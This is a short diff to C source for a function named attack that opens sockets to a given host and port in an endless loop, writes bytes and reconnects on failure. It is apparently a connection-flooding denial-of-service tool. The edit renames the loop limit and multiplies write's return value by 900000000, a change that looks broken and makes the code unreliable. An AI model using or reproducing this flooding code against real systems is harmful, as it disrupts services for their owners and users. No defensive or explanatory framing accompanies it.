@@ -60,10 +60,10 @@ void attack(char *host, char *port, int id) {
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
-		for(x=0; x != PPS; x++) {
+		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-		        r=write(sockets[x], "\0", 1);
+		        r=write(sockets[x], "\0", 1) * 900000000;
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
